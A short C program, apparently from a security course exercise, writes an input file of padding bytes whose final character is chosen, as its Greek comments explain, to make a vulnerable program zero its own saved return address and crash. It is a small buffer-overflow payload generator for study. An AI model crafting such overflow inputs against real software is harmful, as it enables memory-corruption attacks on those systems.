#include<stdio.h>


int main(){
	int  i=0;
    FILE *fp;
    fp = fopen("createdata3.txt", "w+");

	for ( i=0; i<44; i++ ){ /*gemizw ton buf me 44 * */
		fprintf(fp,"*");
	}

	for ( i=0; i<4; i++){    /*bazw sto c 4 midenika den exei simasia giati tha allaksei*/
		fprintf(fp,"0");
	}
    fprintf(fp,"8");       /*sto i dinw to 8 pu se ascii einai to 56 etsi wste*/
                        /*otan ginei stin main buf[i]=0 to buf + i pu tha einai 56*/
                        /*na einai to address tou return address kai na to kanw 0*/
                        /*wste na faei seg fault*/
    fclose(fp);
	return 0;

}